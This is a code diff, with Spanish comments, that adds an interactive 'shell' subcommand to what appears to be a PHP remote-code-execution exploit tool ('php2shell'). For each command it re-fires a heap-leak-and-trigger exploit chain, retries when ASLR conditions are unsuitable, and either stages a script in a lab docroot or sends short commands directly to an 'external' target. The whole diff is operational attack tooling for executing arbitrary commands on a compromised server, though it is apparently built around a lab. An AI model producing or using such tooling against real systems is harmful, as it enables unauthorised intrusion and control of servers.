@@ -260,6 +260,123 @@ def cmd_rce(args: argparse.Namespace) -> int:
 
 
 # ---------------------------------------------------------------------------
+# SUBCOMANDO: shell — pseudoshell interactiva sobre el target RCE
+# ---------------------------------------------------------------------------
+SHELL_SENTINEL = "__P2S_DONE__"
+
+SHELL_HELP = """\n  Cada comando se ejecuta con un worker FRESCO (leak + fire, ~30-60 s).
+  El estado (cd, variables) NO persiste entre comandos; la sintaxis es la
+  completa de sh (pipes, redirecciones, secuencias con ';'). La salida
+  (stdout+stderr) se recupera del fichero de prueba del docroot.
+
+  especiales:  help · esta ayuda    ·    exit / quit · salir"""
+
+
+def cmd_shell(args: argparse.Namespace) -> int:
+    phase("3", f"PSEUDOSHELL interactiva contra {args.url}")
+    if not shutil.which("docker"):
+        die("docker no está disponible")
+    engine = rce_engine()
+    url = args.url
+    lab_managed = url.rstrip("/") == RCE_URL.rstrip("/")
+    if not lab_managed:
+        warn("target EXTERNO: solo comandos directos (≤ 12 bytes ASCII); "
+             "sin recreación de worker (el wrapper no toca contenedores ajenos)")
+    print(SHELL_HELP)
+    www = ROOT / "lab" / "rce" / "www"
+
+    while True:
+        try:
+            line = input("\nphp2shell$ ").strip()
+        except (EOFError, KeyboardInterrupt):
+            print()
+            break
+        if not line:
+            continue
+        if line in ("exit", "quit", "q"):
+            break
+        if line in ("help", "?"):
+            print(SHELL_HELP)
+            continue
+
+        if lab_managed:
+            # --- lab gestionado: sintaxis completa vía script en el docroot ---
+            # El carrier solo admite 14 bytes, así que el comando real viaja en
+            # un script 's' escrito desde el host; el carrier ejecuta `sh s`
+            # (4 bytes). El script escribe stdout+stderr en 'o' y cierra con un
+            # centinela, que distingue "sin salida" de "aún ejecutando".
+            (www / "o").unlink(missing_ok=True)
+            # Subshell: captura la salida de TODA la línea (sin el paréntesis,
+            # en secuencias 'a; b' la redirección solo capturaría la última).
+            (www / "s").write_text(f"( {line} ) >o 2>&1\necho {SHELL_SENTINEL} >>o\n")
+            try:
+                www.chmod(0o777)
+            except OSError:
+                pass
+            print(f"→ {line}")
+            output = None
+            for attempt in range(1, 4):
+                try:
+                    rce_target_fresh()
+                except subprocess.CalledProcessError as exc:
+                    err(f"no se pudo recrear el target: {exc.stderr.strip()[:120]}")
+                    break
+                t0 = time.time()
+                _, _, info = engine.fire_once(url, "sh s", expect="", quiet=True)
+                if "LEAK heap=" not in info.get("probe_out", ""):
+                    warn(f"generación ASLR no apta (intento {attempt}/3) — recreando…")
+                    continue
+                deadline = time.time() + args.timeout
+                while time.time() < deadline:
+                    try:
+                        content = (www / "o").read_text(errors="replace")
+                    except OSError:
+                        content = None
+                    if content and SHELL_SENTINEL in content:
+                        output = content.split(SHELL_SENTINEL, 1)[0]
+                        break
+                    time.sleep(0.5)
+                break
+            if output is None:
+                try:
+                    partial = (www / "o").read_text(errors="replace")
+                except OSError:
+                    partial = ""
+                if attempt < 3 and "LEAK heap=" not in info.get("probe_out", ""):
+                    continue
+                warn(f"sin centinela en {args.timeout}s (comando largo o worker sin ejecutar)")
+                if partial.strip():
+                    note("salida parcial:")
+                    print(partial)
+                continue
+            dt = time.time() - t0
+            print(f"┌── salida ({dt:.1f}s) " + "─" * 40)
+            text = output.rstrip("\n")
+            print(text if text.strip() else "(sin salida)")
+            print("└" + "─" * 60)
+        else:
+            # --- target externo: solo comandos directos dentro del budget ---
+            if not line.isascii() or len(line.encode()) > 12:
+                err("en target externo solo comandos directos ASCII ≤ 12 bytes "
+                    "(el script 's' del lab no se puede escribir en un target ajeno)")
+                continue
+            print(f"→ {line}")
+            _, proof, _ = engine.fire_once(url, line, expect="", quiet=True)
+            if proof is not None:
+                text = proof.rstrip("\n")
+                print(f"┌── salida " + "─" * 40)
+                print(text if text.strip() else "(sin salida)")
+                print("└" + "─" * 60)
+            else:
+                warn("sin prueba — reinicia el worker del target y reintenta")
+
+    if lab_managed:
+        (www / "s").unlink(missing_ok=True)
+    ok("sesión cerrada")
+    return 0
+
+
+# ---------------------------------------------------------------------------
 # SUBCOMANDO: iocs — caza de IOCs
 # ---------------------------------------------------------------------------
 def cmd_iocs(args: argparse.Namespace) -> int:
@@ -322,6 +439,11 @@ def build_parser() -> argparse.ArgumentParser:
     p = sub.add_parser("leak", help="oracle de leak del heap SIN fire")
     p.add_argument("-u", "--url", default=RCE_URL, help=f"target (default: {RCE_URL})")
     p.set_defaults(fn=cmd_leak)
+
+    p = sub.add_parser("shell", help="pseudoshell interactiva sobre el target RCE (un fire por comando)")
+    p.add_argument("-u", "--url", default=RCE_URL, help=f"URL de la víctima (default: {RCE_URL} — lab gestionado; otra URL de loopback = target externo)")
+    p.add_argument("--timeout", type=int, default=30, help="segundos de espera del output de cada comando (default 30)")
+    p.set_defaults(fn=cmd_shell)
 
     p = sub.add_parser("rce", help="cadena RCE completa (probabilística por ASLR; reintentos)")
     p.add_argument("cmd", help='comando a ejecutar (p. ej. "id", <=14 bytes ASCII)')
